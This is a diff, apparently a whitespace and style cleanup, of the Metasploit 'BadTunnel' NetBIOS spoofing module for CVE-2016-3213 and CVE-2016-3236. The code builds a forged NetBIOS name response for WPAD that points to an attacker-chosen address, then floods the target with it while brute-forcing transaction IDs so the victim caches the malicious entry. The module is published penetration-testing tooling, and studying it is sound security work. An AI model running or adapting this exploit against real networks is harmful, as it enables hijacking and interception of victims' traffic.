@@ -7,8 +7,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)',
-      'Description'    => %q{
+      'Name' => 'NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)',
+      'Description' => %q{
           This module listens for a NetBIOS name request and then continuously spams
         NetBIOS responses to a target for given hostname, causing the target to cache
         a malicious address for this name. On high-speed networks, the PPSRATE value
@@ -27,40 +27,38 @@ class MetasploitModule < Msf::Auxiliary
         of NetBIOS requests.
 
       },
-      'Author'     => [
+      'Author' => [
         'vvalien',   # Metasploit Module (post)
         'hdm',       # Metasploit Module
         'tombkeeper' # Vulnerability Discovery
       ],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'Service', 'Description' => 'Run listener for NetBIOS requests and respond to them' ]
-        ],
-      'PassiveActions' =>
-        [
-          'Service'
-        ],
-      'DefaultAction'  => 'Service',
-      'References'     =>
-        [
-          ['URL', 'http://xlab.tencent.com/en/2016/06/17/BadTunnel-A-New-Hope/'],
-          ['CVE', '2016-3213'],
-          ['MSB', 'MS16-063'],
-          ['CVE', '2016-3236'],
-          ['MSB', 'MS16-077']
-        ],
+      'License' => MSF_LICENSE,
+      'Actions' => [
+        [ 'Service', 'Description' => 'Run listener for NetBIOS requests and respond to them' ]
+      ],
+      'PassiveActions' => [
+        'Service'
+      ],
+      'DefaultAction' => 'Service',
+      'References' => [
+        ['URL', 'http://xlab.tencent.com/en/2016/06/17/BadTunnel-A-New-Hope/'],
+        ['CVE', '2016-3213'],
+        ['MSB', 'MS16-063'],
+        ['CVE', '2016-3236'],
+        ['MSB', 'MS16-077']
+      ],
       'DisclosureDate' => 'Jun 14 2016'
     )
 
     register_options(
       [
-        OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
-        OptPort.new('SRVPORT',      [ true, "The local port to listen on.", 137 ]),
-        OptString.new('NBNAME',     [ true, "The NetBIOS name to spoof a reply for", 'WPAD' ]),
-        OptAddress.new('NBADDR',    [ true, "The address that the NetBIOS name should resolve to", Rex::Socket.source_address("50.50.50.50") ]),
-        OptInt.new('PPSRATE',       [ true, "The rate at which to send NetBIOS replies", 1_000])
-      ])
+        OptAddress.new('SRVHOST', [ true, "The local host to listen on.", '0.0.0.0' ]),
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 137 ]),
+        OptString.new('NBNAME', [ true, "The NetBIOS name to spoof a reply for", 'WPAD' ]),
+        OptAddress.new('NBADDR', [ true, "The address that the NetBIOS name should resolve to", Rex::Socket.source_address("50.50.50.50") ]),
+        OptInt.new('PPSRATE', [ true, "The rate at which to send NetBIOS replies", 1_000])
+      ]
+    )
   end
 
   def netbios_service
@@ -94,7 +92,6 @@ class MetasploitModule < Msf::Auxiliary
       @sock.connect(@targ_addr, @targ_port)
 
       netbios_spam
-
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
@@ -106,25 +103,25 @@ class MetasploitModule < Msf::Auxiliary
 
   def netbios_spam
     payload =
-        "\xff\xff"   + # TX ID (will brute force this)
-        "\x85\x00"   + # Flags = response + authoritative + recursion desired
-        "\x00\x00"   + # Questions = 0
-        "\x00\x01"   + # Answer RRs = 1
-        "\x00\x00"   + # Authority RRs = 0
-        "\x00\x00"   + # Additional RRs = 0
-        "\x20"       +
-        Rex::Proto::SMB::Utils.nbname_encode( [@fake_name.upcase].pack("A15") + "\x00" ) +
-        "\x00"       +
-        "\x00\x20"   + # Type = NB
-        "\x00\x01"   + # Class = IN
-        "\x00\x04\x93\xe0" + # TTL long time
-        "\x00\x06"   + # Datalength = 6
-        "\x00\x00"   + # Flags B-node, unique
-        Rex::Socket.addr_aton(@fake_addr)
+      "\xff\xff" + # TX ID (will brute force this)
+      "\x85\x00" + # Flags = response + authoritative + recursion desired
+      "\x00\x00" + # Questions = 0
+      "\x00\x01" + # Answer RRs = 1
+      "\x00\x00" + # Authority RRs = 0
+      "\x00\x00" + # Additional RRs = 0
+      "\x20" +
+      Rex::Proto::SMB::Utils.nbname_encode([@fake_name.upcase].pack("A15") + "\x00") +
+      "\x00" +
+      "\x00\x20" + # Type = NB
+      "\x00\x01" + # Class = IN
+      "\x00\x04\x93\xe0" + # TTL long time
+      "\x00\x06" + # Datalength = 6
+      "\x00\x00" + # Flags B-node, unique
+      Rex::Socket.addr_aton(@fake_addr)
 
     stime = Time.now.to_f
     pcnt = 0
-    pps  = 0
+    pps = 0
 
     print_status("Spamming NetBIOS responses for #{@fake_name}/#{@fake_addr} to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...")
 
@@ -132,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
     while live
       0.upto(65535) do |txid|
         begin
-          payload[0,2] = [txid].pack("n")
+          payload[0, 2] = [txid].pack("n")
           @sock.write(payload)
           pcnt += 1
 
